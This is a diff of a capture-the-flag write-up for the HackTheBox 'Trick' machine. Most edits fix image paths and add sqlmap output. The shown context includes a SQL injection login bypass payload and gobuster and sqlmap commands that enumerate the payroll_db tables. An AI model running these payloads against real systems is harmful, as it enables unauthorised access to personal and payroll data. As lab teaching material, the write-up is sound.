@@ -127,7 +127,7 @@ trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604
 ### http(80)
 Index Page shows that the website is under construction. There's an input for email, but it's not working. Its source code contains has some codes regarding bootstrap only.
 
-![[../attachments/trick_1.png]]
+![[trick_1.png]]
 
 Let's run `gobuster` to find if there is any sub pages.
 
@@ -162,7 +162,7 @@ Finished
 Only generic pages (such as `/assets`, `css`, `/js`) are found.
 Let's try to visit another domain : `preprod-payroll.trick.htb`.
 
-![[../attachments/trick_2.png]]
+![[trick_2.png]]
 
 Also, let's run `gobuster` again to find sub pages.
 
@@ -193,12 +193,12 @@ The name of the software running is `Payroll Management System`
 ### SQL Injection
 Let's try a simple SQL Injection on Login Input. I'll feed a default SQLi input `admin' OR 1=1-- -` on username, and put whatever string on password.
 
-![[../attachments/trick_3.png]]
+![[trick_3.png]]
 
 After trying the standard basic SQL injections, we find that using `admin' or 1=1 --`  as the username and anything as the password works!
 
-![[../attachments/trick_4.png]]
-![[../attachments/trick_5.png]]
+![[trick_4.png]]
+![[trick_5.png]]
 
 "Users" tab on the admin panel provides a function to edit user's properties including password.
 
@@ -279,8 +279,41 @@ Let's try to fetch tables this time.
 ┌──(kali㉿kali)-[~/htb]
 └─$ sqlmap -r req.txt --batch --threads 10 -D payroll_db --tables
 
+<SNIP>
 
-
+[14:07:30] [INFO] adjusting time delay to 2 seconds due to good response times
+position
+[14:08:36] [INFO] retrieved: employee
+[14:09:39] [INFO] retrieved: depart
+[14:10:33] [ERROR] invalid character detected. retrying..
+[14:10:33] [WARNING] increasing time delay to 3 seconds
+ment
+[14:11:17] [INFO] retrieved: payroll_items
+[14:13:52] [INFO] retrieved: attendance
+[14:15:29] [INFO] retrieved: employee_deductions
+[14:19:02] [INFO] retrieved: employee_allowances
+[14:21:14] [INFO] retrieved: users
+[14:22:06] [INFO] retrieved: deductions
+[14:23:51] [INFO] retrieved: 
+[14:24:02] [ERROR] invalid character detected. retrying..
+[14:24:02] [WARNING] increasing time delay to 4 seconds
+payroll
+[14:25:51] [INFO] retrieved: allowances
+Database: payroll_db
+[11 tables]
++---------------------+
+| position            |
+| allowances          |
+| attendance          |
+| deductions          |
+| department          |
+| employee            |
+| employee_allowances |
+| employee_deductions |
+| payroll             |
+| payroll_items       |
+| users               |
++---------------------+
 ```
 
 
